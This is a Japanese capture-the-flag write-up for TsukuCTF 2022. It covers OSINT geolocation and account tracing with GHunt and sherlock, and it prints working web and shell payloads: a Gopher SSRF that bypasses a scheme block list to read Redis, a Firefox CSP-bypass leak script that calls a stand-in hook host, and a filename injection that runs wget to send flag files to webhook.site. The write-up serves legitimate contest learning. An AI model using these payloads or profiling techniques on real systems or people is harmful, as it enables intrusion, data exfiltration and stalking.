# TsukuCTF 2022 Writeup

**目次**
- [[OSINT] Attack of Tsukushi](#osint-attack-of-tsukushi)
- [[OSINT] Money](#osint-money)
- [[OSINT] FlyMeToTheTsukushi](#osint-flymetothetsukushi)
- [[OSINT] inuyama082](#osint-inuyama082)
- [[OSINT] sky](#osint-sky)
- [[OSINT] station](#osint-station)
- [[OSINT] douro](#osint-douro)
- [[OSINT] Where](#osint-where)
- [[OSINT] Gorgeous Interior Bus](#osint-gorgeous-interior-bus)
- [[OSINT] Bringer_of_happpiness](#osint-bringer_of_happpiness)
- [[OSINT] Desk](#osint-desk)
- [[OSINT] PaperJack](#osint-paperjack)
- [[OSINT] TakaiTakai](#osint-takaitakai)
- [[OSINT] banana](#osint-banana)
- [[OSINT] TsukuCTF Big Fan 1](#osint-tsukuctf-big-fan-1)
- [[OSINT] Robot](#osint-robot)
- [[OSINT] Flash](#osint-flash)
- [[OSINT] Bus POWER](#osint-bus-power)
- [[OSINT] what_time_is_it](#osint-what_time_is_it)
- [[OSINT] TsukuCTF Big Fan 3](#osint-tsukuctf-big-fan-3)
- [[OSINT] moon](#osint-moon)
- [[OSINT] uTSUKUSHIi](#osint-utsukushii)
- [[OSINT] TsukuCTF Big Fan 2](#osint-tsukuctf-big-fan-2)
- [[OSINT] Ochakumi](#osint-ochakumi)
- [[OSINT] FlagDM](#osint-flagdm)
- [[OSINT] hub_been_stolen](#osint-hub_been_stolen)
- [[Web] bughunter](#web-bughunter)
- [[Web] viewer](#web-viewer)
- [[Web] leaks4b](#web-leaks4b)
- [[Misc] Lucky Number 777](#misc-lucky-number-777)
- [[Misc] soder](#misc-soder)
- [[Misc] nako3ndbox](#misc-nako3ndbox)
- [[Hardware] DefuseBomb](#hardware-defusebomb)
- [[Reversing] GrandpaMemory](#reversing-grandpamemory)
- [Welcome](#welcome)

## [OSINT] Attack of Tsukushi

Google レンズにぶん投げたら進撃の巨人のキャラの銅像らしく、更にJR日田駅にあることまでわかった。

`TsukuCTF22{8770013}`

## [OSINT] Money

Google レンズにぶん投げたら金閣寺にあることが判明

`TsukuCTF22{6038361}`

## [OSINT] FlyMeToTheTsukushi

Google レンズに投げた結果を参考にしながら出てきた空港を検索してたらそれっぽい空港が出てきた

`TsukuCTF22{福岡}`

## [OSINT] inuyama082

Google レンズにぶん投げたら「犬山よあけや」という店のお菓子らしいことが判明したので、[メニュー](https://www.yoakeya1916.com/menu-%E3%83%A1%E3%83%8B%E3%83%A5%E3%83%BC/caf%C3%A9-menu-%E3%82%AB%E3%83%95%E3%82%A7%E3%83%A1%E3%83%8B%E3%83%A5%E3%83%BC/)を眺めてフラグフォーマットに合いそうなものを探した。

`TsukuCTF22{和チーズケーキ ver.煎茶パウダー}`

## [OSINT] sky
Google レンズを使うと「名古屋鉄道 空港特急 ミュースカイ」であることがわかり、駅数が少ないので適当に駅を入力する。

`TsukuCTF22{名鉄名古屋}`

## [OSINT] station

左上の案内を元にチームメイトが[札幌市の路線](https://www.city.sapporo.jp/st/route_konaizu/index.html)である事を突き止めてくれたので、一番上の黄色い帯に書かれている「丁目」を駅名として持ち、下の部分的な情報を上手く解釈できるような駅を探したらあった。

`TsukuCTF22{西11丁目}`

## [OSINT] douro

「Xいはモール」や「Xいほモール」のような文字が見えてXも「よ」っぽいのでその辺を適当に検索かけたら「よいほモール」が存在している事が判明。どうもこのタイルは商店街にあるものらしいが複数あるのでバーチャル散歩ことストリートビューで周りの背景を元に探したら[見つかった](https://www.google.com/maps/place/%EF%BC%B0%EF%BC%A1%EF%BC%B0%EF%BC%A9%EF%BC%A5%EF%BC%B2%EF%BC%86%EF%BC%A7%EF%BC%A1%EF%BC%AC%EF%BC%AC%EF%BC%A5%EF%BC%B2%EF%BC%B9/@34.5763729,136.5312642,3a,15y,82.39h,82.85t/data=!3m6!1e1!3m4!1s0py8FCJ-PtjpfuVuK6VtTQ!2e0!7i16384!8i8192!4m12!1m6!3m5!1s0x0:0x987c459d77daf962!2z77yw77yh77yw77yp77yl77yy77yG77yn77yh77ys77ys77yl77yy77y5!8m2!3d34.5763726!4d136.5314027!3m4!1s0x60046adf5845d03b:0x987c459d77daf962!8m2!3d34.5763726!4d136.5314027)

`TsukuCTF22{34.5763_136.5312}` (回答後に再現したため不正確な可能性有り)

## [OSINT] Where

渋谷スクランブルスクエアとその近隣のクソデカビル、左下のマルイが収まりそうで比較的高さがありそうな場所をGoogleマップで探したら渋谷パルコが候補に上がって入れたら通った。

`TsukuCTF22{1973/06/14}` (回答後に閲覧履歴から拾ってきたため不正確な可能性有り)

## [OSINT] Gorgeous Interior Bus
Google レンズを使うと、「湯～遊～バス」で次の停車駅が銀座であることがわかる。

`TsukuCTF22{東海岸町}`

## [OSINT] Bringer_of_happpiness
Google レンズを使うと島原鉄道であることがわかり、ストリートビューでいくつかの駅を調べると、島原港駅であることがわかる。

`TsukuCTF22{32.7693_130.3707}`

## [OSINT] Desk

パンフレットから沖縄っぽいことがわかったのとチームメイトが写っているゆるキャラが南城市のものである事を特定してくれた。航空写真で海沿いの赤い屋根の建物を探していたら、ある程度の範囲は絞り込めたのでストリートビューで更に絞り、あとは近辺の施設の郵便番号を適当に入れていったら当たった。

`TsukuCTF22{9011511}`

## [OSINT] PaperJack

「ゲーム 新聞 コラボ」みたいな検索をしていると[こんな記事](https://xtrend.nikkei.com/atcl/contents/forcast/00004/00158/)が生えて来たので[該当する企画のHP](https://5th.fate-go.jp/)のArchive欄を眺めていたら画像に[該当する場所](http://www.dojoji.com/)が見つかる

`TsukuCTF22{6491331}`

## [OSINT] TakaiTakai
Google レンズを使うとマンションがヒットし、渋谷ソラスタからの眺めだとわかる。

`TsukuCTF22{2019/03/29}`

## [OSINT] banana
Google レンズを使うと、デデド朝市会場のトイレであることがわかる。

`TsukuCTF22{13.5209_144.8287}`

## [OSINT] TsukuCTF Big Fan 1

TsukuCTFのTwitterアカウントのフォロワーが高々200人弱しか居ないので適当に眺めてたら添付画像のアイコンをした[アカウント](https://twitter.com/SuperProStalker)があった。

Twitter Webだとアカウント作成日の日付まで表示してくれないっぽいので[適当なサイト](https://midnight2d.com/itsukara/)でアカウント作成日を調べる。

`TsukuCTF22{2021/11/29}`

## [OSINT] Robot
Google レンズを使うと、
![](https://gyazo.com/74e3b8c3ee43fbf414fa64e6b22e578d/max_size/1000)
が出てくる。

`TsukuCTF22{South China University of Technology}`

## [OSINT] Flash
アパホテルが好きなので、初手で不意に「apa」とgrepしたらSSID`apa-316-2428`がヒットしてしまった。フラグのフォーマットから「アパホテル&リゾート」であることがわかり、このブランドを冠するホテルは10個ほどしかないため全探索する。

`TsukuCTF22{アパホテル&リゾート〈両国駅タワー〉_2428}`

## [OSINT] Bus POWER
画像からバスの車番が2822でこのバスが梅津営業所所属であることと、行き先が四条河原町であることがわかる。[京都市営バス梅津営業所 - Wikipedia](https://ja.wikipedia.org/wiki/%E4%BA%AC%E9%83%BD%E5%B8%82%E5%96%B6%E3%83%90%E3%82%B9%E6%A2%85%E6%B4%A5%E5%96%B6%E6%A5%AD%E6%89%80)を見ると、
> 3、27、特27、32、52、75、80、特80、93、特93、急行100、201、特205、M1、立命館ダイレクトの各系統は交通局直営で運行している。 それ以外の8、特8、10、11、26、59は、西日本ジェイアールバスに委託運行している。

と書いてあり、これら系統のYouTube乗車動画を4倍速＆適宜スキップで眺めていると、[10号系統の動画](https://www.youtube.com/watch?v=ORVdLSt2Jxk)に画像の場所を発見できた。

`TsukuCTF22{千本今出川}`

## [OSINT] what_time_is_it
Google レンズを使うと、「うずしお」の2600系だとわかる。また、Google 検索を使って徳島駅発だと特定できる。

`TsukuCTF22{15:23}`

## [OSINT] TsukuCTF Big Fan 3

TsukuCTF Big Fan 1で見つけたアカウントが[こんな投稿](https://twitter.com/SuperProStalker/status/1571273887371120640)をしているので引用先のリンクをInternet Archiveで検索したら有効なGoogle Driveのリンクが書かれていて中身は本名や誕生日やメアドや勤務先が載っているCSVだった。

[このツイート](https://twitter.com/SuperProStalker/status/1581681692242477059)からメアドの先頭3文字がbyuであることがわかるのでこれで検索してみたらある行がヒットした。

`TsukuCTF22{1980/01/10}`

## [OSINT] moon

2枚目の右上に非常に小さく「京都」と書かれているので京都のどこかである事は判明。チームメイトの皆様が適切な検索ワードでTwitter検索し、中之島から渡月橋へ行く間のどこかに存在しているというツイートを拾ってきてくれたのでそれを元にしてストリートビューで中之島を散歩してたら[見つけた](https://www.google.com/maps/@35.0120643,135.6778289,2a,75y,188.8h,37.1t/data=!3m6!1e1!3m4!1slOQ-Z4umiaaMmIWKlQNN1Q!2e0!7i13312!8i6656)

`TsukuCTF22{35.0120_135.6778}` (回答後に再現したため不正確な可能性有り)

## [OSINT] uTSUKUSHIi
「猫カフェ　京都」と検索して一番最初に出てくる猫カフェと床や家具が一致している。[公式サイト](https://catmocha.jp/shop/kawaramachi/)でネコ一覧を見ると「そっくす」くんだとわかる。

`TsukuCTF22{2021/09/16}`

## [OSINT] TsukuCTF Big Fan 2

TsukuCTF Big Fan 1で見つけたアカウントのツイート:

- https://twitter.com/SuperProStalker/status/1571228640981192704

`ctf 073b6d com` は `xn--ctf-073b6d.com` （`つくctf.com`）だと、チームメイトがguess([このツイート](https://twitter.com/SuperProStalker/status/1582443953109884929)より)。

アクセスすると例の動画にリダイレクトされる。リダイレクト前のレスポンスからも有益な情報はなし。

https://www.nmmapper.com/sys/tools/subdomainfinder/ にドメインを投げてみると`
this-is-flag-site.xn--ctf-073b6d.com`のサブドメインを入手。

> base64 encoded:
>
> VHN1a3VDVEYyMnt3aDQ3XzE1XzRfcHVuMWMwZDM/fQo=

base64をデコードしてフラグ。

`TsukuCTF22{wh47_15_4_pun1c0d3?}`

## [OSINT] Ochakumi

```
http://tsuku22qotvyqz5kbygsmxvijjg7jg2d7rgc42qhaqt3ryj66lntrmid.onion.ws
```
にアクセスすると、GoのWASM製Webサービスが動いている。

WASMファイルをローカルに落として、stringsを眺めていると
```
path    github.com/GaOACafa/website
mod     github.com/GaOACafa/website     (devel)
```
の文字列が見えた。解析に費やした時間を返してほしい。

https://github.com/GaOACafa/website/blob/master/.gitignore
に `public/this_is_flag_dbKIMLQnMCI2fp0.html` が書いてあるので、

http://tsuku22qotvyqz5kbygsmxvijjg7jg2d7rgc42qhaqt3ryj66lntrmid.onion.ws/this_is_flag_dbKIMLQnMCI2fp0.html にアクセスするとフラグ。

`TsukuCTF22{C0uld_w45m_h4v6_p6r50n4l_1nf0rm4710n?}`

## [OSINT] FlagDM

xeuledocに投げると
```shell
$ xeuledoc https://docs.google.com/document/d/1y266JcI1E8piugLQDPaK7boSzAKykg4FepQZIOt4Phg/edit
... snip ...

Name : my real name is secret
Email : mpju40nchoyba85@gmail.com
Google ID : 03458870179467391774
```
でGmail特定。

ghuntに投げると
```shell
$ docker run -v ghunt-resources:/usr/src/app/resources -ti ghcr.io/mxrch/ghunt ghunt.py email mpju40nchoyba85@gmail.com
... snip ...

Name : my real name is secret

[+] Custom profile picture !
=> https://lh3.googleusercontent.com/a-/ACNPEu_leXrOIIzCIna7Jx_LcstS9GGLCDF8HfbnQ-rS

Last profile edit : 2022/10/04 17:21:29 (UTC)

Email : mpju40nchoyba85@gmail.com
Gaia ID : 117114600888142762916

Hangouts Bot : No

[-] Unable to fetch connected Google services.

[-] YouTube channel not found.

Google Maps : https://www.google.com/maps/contrib/117114600888142762916/reviews
[-] No reviews    

Google Calendar : https://calendar.google.com/calendar/u/0/embed?src=mpju40nchoyba85@gmail.com
[-] No public Google Calendar.
```

https://www.google.com/maps/contrib/117114600888142762916/reviews にアクセスすると、画像を投稿していた:

- 画像の右下にTwitter IDが書いてある: https://twitter.com/07xm8d9pzp
- Twitterプロフィールにyoutubeチャンネルのリンクがあるが有益な情報はなし

[sherlock](https://github.com/sherlock-project/sherlock)に`gross_poem`のユーザ名を投げてみる:
```shell
$ python3 sherlock gross_poem
[*] Checking username gross_poem on:

[+] Instagram: https://www.instagram.com/gross_poem
[+] Trakt: https://www.trakt.tv/users/gross_poem
[+] koo: https://www.kooapp.com/profile/gross_poem

[*] Results: 3

[!] End:  The processing has been finished.
```

https://www.trakt.tv/users/gross_poem にアクセスするとbase64があり、フラグ。

- `TmljZSEgRmxhZyBpcyBIZXJlISAtPiBUc3VrdUNURjIye000bnlfMFMxTjdfNzAwbHNfM3gxNTd9Cg==`

`TsukuCTF22{M4ny_0S1N7_700ls_3x157}`

## [OSINT] hub_been_stolen
2つの公開鍵のnをgcdすると素数が求められて、秘密鍵を構築できる。問題名からGitHub関連の問題であることがわかり、この秘密鍵を使ってGitHubにSSHするとアカウント名がわかる。

```
$ ssh -T git@github.com
Hi Ann0nymusTsukushi! You've successfully authenticated, but GitHub does not provide shell access.
```

https://github.com/Ann0nymusTsukushi に、
```
Here it is!!! Decode with base64. XC5cLlwuXC5cLiBUc3VrdUNURjIye04wX3c0eV9VX2YxbmRfTTN9IC4vLi8uLy4vLi8=
```

とあるので、デコードする。

`TsukuCTF22{N0_w4y_U_f1nd_M3}`

## [Web] bughunter

問題文に`RFC9116`のタグが付いているので察する。

`/.well-known/security.txt`にアクセスするとフラグ。

`TsukuCTF22{y0u_c4n_c47ch_bu65_4ll_y34r_r0und_1n_7h3_1n73rn37}`

## [Web] viewer

- curlのSSRF問
- フラグはサーバ上の`app.py`を直接読みに行くか、Redisに保存されている値を見に行けば手に入る

```python
blacklist_of_scheme = ['dict', 'file', 'ftp', 'gopher', 'imap', 'ldap', 'mqtt', 'pop3', 'rtmp', 'rtsp', 'scp', 'smb', 'smtp', 'telnet']

def url_sanitizer(uri: str) -> str:
    if len(uri) == 0 or any([scheme in uri for scheme in blacklist_of_scheme]):
        return "https://fans.sechack365.com"
    return uri
```
は`Gopher://`のように大文字を使えばbypassでき、gopher protocolでRedisにアクセスできる。

```python
blacklist_in_response = ['TsukuCTF22']

def response_sanitizer(body: str) -> str:
    if any([scheme in body for scheme in blacklist_in_response]):
        return "SANITIZED: a sensitive data is included!"
    return body
```
はフラグの部分文字列がいい感じに出力されるようなコマンドをRedisサーバに送りつければbypassできる。今回は`GETRANGE`を使った。

gopherペイロードの生成:
```python
import urllib.parse

BASE_URL = "Gopher://redis:6379"

# # 最初にすべてのキーを入手する
# payload = """
# KEYS *
# QUIT
# """.lstrip()

key = "ffde9d42-39d4-448c-b7a2-fb45fee6e9c7"
payload = f"""
GETRANGE {key} 57 -1
QUIT
""".lstrip()

url = f"{BASE_URL}/x{urllib.parse.quote(payload)}"
print(url)
```

```
Gopher://redis:6379/xGETRANGE%20ffde9d42-39d4-448c-b7a2-fb45fee6e9c7%2057%20-1%0AQUIT%0A
```
を投げると
```
$33 sukuCTF22{ur1_scheme_1s_u5efu1}"} +OK
```
でフラグが手に入る。

`TsukuCTF22{ur1_scheme_1s_u5efu1}`

## [Web] leaks4b

- 問題名からもソースコードからもXS-Leaksっぽい問題
- フラグはbotのクッキー
- フラグ形式: `TsukuCTF22{[a-z]{7}}`
- CSP: `<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-{nonce}'; base-uri 'none'; connect-src 'none'; font-src 'none'; form-action 'none'; frame-src 'none'; object-src 'none'; require-trusted-types-for 'script'; worker-src 'none';">`
    - かなり厳しい。XSSは無理
- 自明なContent Injectionができるが `["stylesheet", "import", "image", "style", "flag", "link", "img", "\"", "$", "'", "(", ")", "*", "+", ":", ";", "?", "@", "[", "\\", "]", "^", "{", "}"]`のブラックリストによるバリデーションがある
    - ソースコードのコメントにあるようにCSS InjectionやReDoSは無理そう

ここで、冷静に配布ファイルを読むと、botはchromeではなくfirefoxであることがわかり、firefox特有の問題だと察する。User-Agentからfirefoxのバージョンは104。

そういえば作問陣のSatokiさんがfirefoxのCVEを取得していたことを思い出し確認しに行く:

- https://www.mozilla.org/en-US/security/advisories/mfsa2022-40/#CVE-2022-40956

105で修正されているので使えそう。`<base>`タグのバグでCSP bypassできる。

```python
import httpx
import string
import time
import urllib.parse

BASE_URL = "http://133.130.96.134:31416"
HOOK_URL = "https://hook.example.com"

CHARS = string.ascii_lowercase

prefix = ".suku...22.cakeum"
# TsukuCTF22{cakeuma}

def f(prefix: str, c: str):
    print(prefix + c)

    cake = f"{prefix}{c}|<base href={HOOK_URL[6:]}/>"
    if len(cake) > 100:
        print(f"too long: {cake}")
        exit(1)

    url = f"{BASE_URL}?cake={urllib.parse.quote(cake)}"

    httpx.get(f"{HOOK_URL}/{prefix + c}")
    res = httpx.post(
        f"{BASE_URL}/order",
        data={
            "url": url,
        },
    )

for c in CHARS:
    f(prefix, c)
    time.sleep(3)
```

こんな感じのスクリプトを実行すると、アクセスした画像のパスのリクエストが`HOOK_URL`に飛んでしまうので`/static/img/flag0.jpg`にアクセスするかどうかで1文字ずつ確定する。

`TsukuCTF22{cakeuma}`

## [Misc] Lucky Number 777
初手の方針として、 `"flag>='GUESSED_FLAG'"` という文字列を送信し、フラグの先頭から1文字ずつ特定するのを試したが、 `TsukuCTF22{wh4ts_` というところまで求まったところで `_` が送信できなくなり、この方針は詰んでしまった。

その後 Ark さんが https://docs.python.org/ja/3.8/library/string.html#formatstrings を見つけてくれた。フォーマット書式の最後に `!r` や `!s` をつけることで repr や str を表示するようになるらしい。
ということで `f"{flag!s}"` と送信することでフラグが表示された。

`TsukuCTF22{wh4ts_new_1n_pyth0n_3X}`

## [Misc] soder
フラグにマッチしたらタイムアウトさせる。
`<FLAG>(((((((.*)*)*)*)*)*)*)!`や`^(?=<FLAG>)((.*)*)*salt$`を使った。

`TsukuCTF22{4_w47ch3d_p07_n3v3r_b01l5}`

## [Misc] nako3ndbox
なでしこのバージョンが3.3.67だが、[3.3.69でRCEが修正されている](https://github.com/kujirahand/nadesiko3/releases/tag/3.3.69)。このテストに従って、ペイロードを構築する。wgetでwebhook.siteに投げた（が、エラーメッセージにも出力された）。

```
TMP="/tmp";FILE=「{TMP}/\'a\'`wget https://webhook.site/c9b1585a-dc47-4d43-b883-3af88ea899b8?$(cat fla*)`\'c」;ZIP=「{TMP}/test.zip」;FILEをZIPに圧縮。
```

`TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}`

## [Hardware] DefuseBomb
スイッチが ON/OFF いずれのときにも爆弾が1にならないように回路を切断する問題。
#### 1つ目
TC74HC02AP は [NOR](https://toshiba.semicon-storage.com/info/TC74HC02AP_datasheet_ja_20140301.pdf?did=6965&prodName=TC74HC02AP)
TC74HC08AP は [AND](https://toshiba.semicon-storage.com/info/TC74HC08AP_datasheet_ja_20140301.pdf?did=7496&prodName=TC74HC08AP)

AND1ピンが GND なので AND3ピンが常に0。よって NOR3ピンも常に0
→NOR2ピンが ON/OFF かで bomb の OFF/ON が決まる
NOR2ピンを決める NOR10ピンがスイッチ ON/OFF にかかわらず1であることが必要
→NOR8, 9が常に0
→切るべきは4番
#### 2つ目
limit timer がONになって爆発する原理は、
Q3Q4を縦に電流が流れるようになり、Q8 1ピンがGNDになり、Q8の縦に電流が流れなくなる
→当然Q7の縦にも電流が流れない
→bomb が1となり、終わり
なので、切るべきは4番。
4番を切ってもQ7の縦に電流は流れるので問題なし。
#### 3つ目
見たことのない拡張子のファイルがたくさんあるが、調べて見るとガーバーデータというものであることがわかる。これを表示するために gerbv というものをインストールし、すべてのファイルを開くと以下のような回路が表示される。
![](https://i.imgur.com/uTFtlt2.png)
☓のようになっている部分が GND っぽい。
- bomb が爆発しないようにするには、4ピン5ピンがどちらも1でないとだめ
- 5ピンは4番を切らない限りは常に1 (∵9ピンが常に0)

→4ピン=3ピン=NOT(1ピン) なので、2番を切ればスイッチのON/OFFに関わらず1ピンが常に0になる。

以上を踏まえて `TsukuCTF22{442}` と submit したら通った。

## [Reversing] GrandpaMemory

fileコマンドで配布ファイルを調べると、`a.out: PDP-11 old overlay`という結果が得られるのでPDP-11のディスアセンブラを探したら[このツール](https://github.com/caldwell/pdp11dasm)が見つかった。

これでディスアセンブルをしてみるとレジスタ`r1`と`r2`をゼロクリアしてインクリメントして`r1`を4回、`r2`を1回左シフトして`r2`に足すという処理をしており、更にバイナリの末端に`passwd is in R2`という記述が見られるのでこの結果である18を`N`としてフラグを提出

`TsukuCTF22{18}`

## Welcome
`TsukuCTF22{Welcome_to_TsukuCTF_2022!!!!}`
